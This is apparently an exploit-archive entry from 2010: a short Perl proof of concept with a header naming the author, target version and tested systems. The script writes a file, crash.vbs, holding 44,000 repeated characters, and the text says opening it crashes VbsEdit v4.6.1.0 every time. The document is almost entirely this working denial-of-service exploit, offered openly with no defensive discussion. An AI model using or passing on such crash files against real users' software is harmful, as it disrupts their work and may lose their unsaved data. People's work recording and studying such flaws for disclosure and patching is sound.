# Exploit Title: VbsEdit v4.6.1.0 DoS
# Date: 8 / 12 / 2010
# Author: C G Tan
# Software Link: http://www.vbsedit.com/tr_download.asp
# Version: v4.6.1.0 32-bit Version
# Tested on: Windows XP SP 2, Windows XP SP 3
# CVE : N / A
# Description : This is the latest version from the official website.

#!/usr/bin/perl

#Opening crash.vbs in VbsEdit will cause VbsEdit to crash consistently.
 
open FILE, ">crash.vbs";
print FILE 'a'x44000;
close FILE;
